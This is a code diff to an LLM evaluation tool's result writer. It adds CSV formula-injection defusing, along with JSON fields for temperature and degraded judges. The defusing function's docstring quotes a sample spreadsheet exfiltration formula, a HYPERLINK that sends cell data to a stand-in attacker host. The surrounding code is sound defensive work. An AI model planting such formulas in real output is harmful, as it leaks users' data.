@@ -68,7 +68,7 @@ CSV_COLUMNS: tuple[str, ...] = (
 @dataclass
 class BatchResult:
     """A single batch row - the union of a StreamState and a BatchPrompt,
-    optionally enriched with judge scores (Phase 8) and assertion results (Phase 9).
+    optionally enriched with judge scores and assertion results.
     """
 
     prompt_id: str
@@ -88,9 +88,9 @@ class BatchResult:
     # The raw assertion configs from the user's input file. Always preserved
     # so JSON round-trips the user's intent even when assertions were skipped.
     assertions_raw: list[dict[str, Any]] = field(default_factory=list)
-    # Phase 8 judging: None when judging wasn't requested for this batch.
+    # None when judging wasn't requested for this batch.
     judge_result: JudgeResult | None = None
-    # Phase 9 assertions: None when assertion execution was skipped
+    # None when assertion execution was skipped
     # (--no-assertions, or failed main call); empty list when the prompt
     # simply had no assertions configured.
     assertion_results: list[AssertionResult] | None = None
@@ -259,7 +259,12 @@ def _format_csv(
                 ci = model_cis.get(m)
                 row[f"{m}_ci_low"] = _none_or(ci["ci_low"]) if ci else ""
                 row[f"{m}_ci_high"] = _none_or(ci["ci_high"]) if ci else ""
-        writer.writerow(row)
+        # Defuse formulas at the write boundary, once, rather than at the 21
+        # field assignments above: `prompt_id` and `model` have never had an
+        # escaping helper, and a column added later would not get one either.
+        # Deliberately here and not upstream - the same values feed JSON and
+        # Markdown, which need no formula defence and must not gain the prefix.
+        writer.writerow({key: _defuse_formula(value) for key, value in row.items()})
     return buf.getvalue()
 
 
@@ -285,6 +290,37 @@ def _csv_escape(text: str) -> str:
     return text.replace("\r\n", "\\n").replace("\n", "\\n").replace("\r", "\\r")
 
 
+# The characters OWASP lists as formula-initiating. Tab and the two newlines
+# are on the list because some importers strip leading whitespace before
+# deciding whether a cell is a formula.
+FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r", "\n")
+
+
+def _defuse_formula(value: Any) -> Any:
+    """Prefix a cell that a spreadsheet would otherwise evaluate as a formula.
+
+    A model response of `=HYPERLINK("http://evil.example/?d="&A2,"Click")` is
+    valid CSV and a live exfiltration link the moment the file is opened in
+    Excel, Google Sheets or LibreOffice. The leading apostrophe is OWASP's
+    recommended mitigation: spreadsheets read it as "the rest of this cell is
+    text" rather than as data. The value is preserved, not stripped - a
+    consumer recovers the original by removing one leading `'`.
+
+    Known limit, from OWASP's own page: none of the standard mitigations
+    survives Microsoft Excel saving and re-opening the file, because Excel may
+    drop the quoting on the way out. That makes this incomplete, not useless -
+    it defends the common case of opening a freshly written file. Do not remove
+    it on discovering the limitation.
+
+    Applies to `str` values only. Every numeric column holds a float or an int
+    when it has a value and `''` when it does not, so type is a sufficient
+    guard and a column added later is covered without being enumerated.
+    """
+    if isinstance(value, str) and value.startswith(FORMULA_PREFIXES):
+        return "'" + value
+    return value
+
+
 def _none_or(value: float | None) -> Any:
     """Render None as the empty string in CSV (vs the literal 'None')."""
     return "" if value is None else value
@@ -300,6 +336,8 @@ def _format_json(
     stats_by_cell_cis: dict | None = None,
     mcnemar_results: list | None = None,
     methodology: dict | None = None,
+    models_without_temperature: list[str] | None = None,
+    significance_temperature_mixed: bool = False,
 ) -> str:
     """Build the JSON payload string with metadata header + results array.
 
@@ -312,7 +350,16 @@ def _format_json(
         * top-level `total_runs`
         * top-level `stats_by_cell` array (one entry per cell)
         * each result record gains a `run_index`
-    When `runs == 1`, the schema is byte-identical to v0.1.0.
+    When `runs == 1`, the schema is otherwise byte-identical to v0.1.0.
+
+    EXCEPTIONS, from 0.1.5: top-level `models_without_temperature` (a list) and
+    top-level `significance_temperature_mixed` (a bool) are ALWAYS present,
+    unconditionally - the list even when empty, the bool even when False. Every
+    other additive key here is kept conditional to preserve byte-identical
+    output; these two are deliberately not, because a consumer must be able to
+    read them directly rather than treat absence as "no models were affected"
+    or "the samples were comparable" - either of which would be
+    indistinguishable from an older version that never emitted the key.
 
     When `significance_results` is provided and non-empty, a
     `significance_tests` array is added. When it's None/empty, no new
@@ -332,6 +379,8 @@ def _format_json(
         "total_cost_usd": total_cost,
         "total_results": len(results),
         "failed_results": sum(1 for r in results if r.error),
+        "models_without_temperature": list(models_without_temperature or []),
+        "significance_temperature_mixed": bool(significance_temperature_mixed),
         "results": [_result_to_dict(r, include_run_index=runs > 1) for r in results],
     }
     if runs > 1:
@@ -431,6 +480,8 @@ def write_json(
     stats_by_cell_cis: dict | None = None,
     mcnemar_results: list | None = None,
     methodology: dict | None = None,
+    models_without_temperature: list[str] | None = None,
+    significance_temperature_mixed: bool = False,
 ) -> None:
     """Atomic write of `results` to `output_path` as JSON."""
     atomic_write_bytes(
@@ -442,6 +493,8 @@ def write_json(
             stats_by_cell_cis=stats_by_cell_cis,
             mcnemar_results=mcnemar_results,
             methodology=methodology,
+            models_without_temperature=models_without_temperature,
+            significance_temperature_mixed=significance_temperature_mixed,
         ).encode("utf-8"),
     )
 
@@ -579,6 +632,7 @@ def _result_to_dict(r: BatchResult, include_run_index: bool = False) -> dict[str
         out["judge_score_avg"] = r.judge_result.average_score
         out["judge_score_std"] = r.judge_result.std_dev
         out["judge_skipped"] = list(r.judge_result.skipped_models)
+        out["judge_degraded"] = list(r.judge_result.degraded_models)
         if r.judge_result.aggregated_risk_level is not None:
             out["hallucination_risk"] = r.judge_result.aggregated_risk_level
     if r.assertion_results is not None:
@@ -1062,18 +1116,25 @@ def _judge_summary_cell(r: BatchResult) -> str:
         return "-"
 
     judges = r.judge_result.judges
+    # Degraded-judge caveat belongs HERE, in the scored path. The early-return
+    # branch above only fires when there are no judges at all, so a degraded
+    # judge - which still produces a score - would never reach it.
+    degraded = r.judge_result.degraded_models
+    suffix = f" (degraded: {', '.join(degraded)})" if degraded else ""
+
     successful = [j for j in judges if j.score is not None]
     if not successful:
-        return "N/A (judge parse failed)"
+        return "N/A (judge parse failed)" + suffix
 
     if len(successful) == 1 and len(judges) == 1:
-        return str(successful[0].score)
+        return str(successful[0].score) + suffix
 
     avg = r.judge_result.average_score
     breakdown = ", ".join(
         f"{j.model.split('/')[-1]}: {j.score if j.score is not None else 'X'}" for j in judges
     )
-    return f"Avg {avg:.1f} [{breakdown}]" if avg is not None else f"[{breakdown}]"
+    base = f"Avg {avg:.1f} [{breakdown}]" if avg is not None else f"[{breakdown}]"
+    return base + suffix
 
 
 def _md_escape(text: str) -> str:
